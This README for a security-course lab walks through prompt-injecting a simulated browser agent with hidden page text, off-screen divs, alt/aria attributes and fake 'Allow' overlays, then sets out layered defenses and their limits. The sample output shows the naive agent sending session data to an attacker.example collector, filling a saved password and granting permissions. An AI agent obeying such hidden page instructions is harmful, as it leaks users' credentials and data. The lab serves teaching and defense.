# Lab: Attacking a Browser/Computer-Use Agent via Malicious Page Content

**Course exercise:** "Attacking a Browser/Computer-Use Agent via Malicious Page Content". Lessons: [04 attacking browser and computer-use agents](../../04-attacking-browser-and-computer-use-agents.md), [05](../../05-defending-computer-use-and-coding-agents.md). Background: [prompt injection (incl. cross-modal)](../../../../02-llm-security/prompt-injection/README.md).

**Time:** 45 minutes. **Safety:** local HTML files only; no browser, no network, no real site. The agent is a Python class that parses HTML with the standard library and records what it **would** do. The "password" is `FAKE-SAVED-PASSWORD-1234`. Domains are `.example`.

## Fixtures (`fixtures/`)

| File | Trick |
|---|---|
| `benign.html` | control page, nothing hidden |
| `hidden-text.html` | `display:none`, `font-size:0`, and white-on-white text carrying instructions |
| `offscreen.html` | a `div` positioned at `left:-9999px` |
| `alt-text.html` | instructions in `alt`, `title` and `aria-label` |
| `fake-allow-overlay.html` | a full-screen fake "Allow" dialog, plus an invisible overlay button over the page |

The **naive** perception dumps all text plus alt/title/aria-label. The **visible-only** perception drops hidden or off-screen nodes, ignores alt/title/aria text, and removes overlay elements (invisible or full-screen, high `z-index`) from the action surface.

## Defenses (switches in `Defenses`)

| Defense | Stops |
|---|---|
| `visible_only` | all four attack pages (the agent never sees the hidden text or the overlay buttons) |
| `domain_allowlist` | navigation to the attacker domain only |
| `no_autofill` | the saved-password fill only |
| `approval_actions` (+ `approve`) | `grant-permissions`, `download`, `export` clicks until a human approves |

As in the other labs, one layer rarely covers everything. Note the limit of `visible_only`: it uses simple inline-style rules. Real pages hide text with CSS classes, scripts and rendering tricks, so a production defense needs a real renderer (compute the final style and the on-screen position) or a screenshot-based check, plus the policy layers.

## Steps

```text
.venv/Scripts/python caase-course/ch4-computer-use-browser-and-coding-agents/labs/browser-agent-page-injection/demo.py
.venv/Scripts/python -m pytest caase-course/ch4-computer-use-browser-and-coding-agents/labs/browser-agent-page-injection -v
```

1. Run the demo: every attack page succeeds against the naive agent and fails against the defended one.
2. Add a new fixture that hides text with `<style>.x{display:none}</style><p class="x">...`. Does `visible_only` catch it? (No: it reads inline styles only. That is the limit above. Extend `is_hidden`, or turn on the domain and approval layers.)
3. Add a CSS `clip` or `transform:scale(0)` trick and extend `is_hidden`.
4. Allow the attacker domain by mistake with `domain_allowlist=("example",)`. What happens? (Lookalike matching: the tests show why you match whole labels.)

## Expected output (real run)

```text
benign               naive    navigations=[] clicks=[] creds=0 grants=[]
benign               defended navigations=[] clicks=[] creds=0 grants=[]
hidden-text          naive    navigations=['http://collector.attacker.example/log?s=session'] clicks=['Export'] creds=1 grants=[]
hidden-text          defended navigations=[] clicks=[] creds=0 grants=[]
offscreen            naive    navigations=['http://collector.attacker.example/offscreen'] clicks=[] creds=0 grants=[]
offscreen            defended navigations=[] clicks=[] creds=0 grants=[]
alt-text             naive    navigations=['http://collector.attacker.example/alt'] clicks=['Export'] creds=1 grants=[]
alt-text             defended navigations=[] clicks=[] creds=0 grants=[]
fake-allow-overlay   naive    navigations=[] clicks=['Allow', 'Play video'] creds=0 grants=['permissions']
fake-allow-overlay   defended navigations=[] clicks=[] creds=0 grants=[]
```
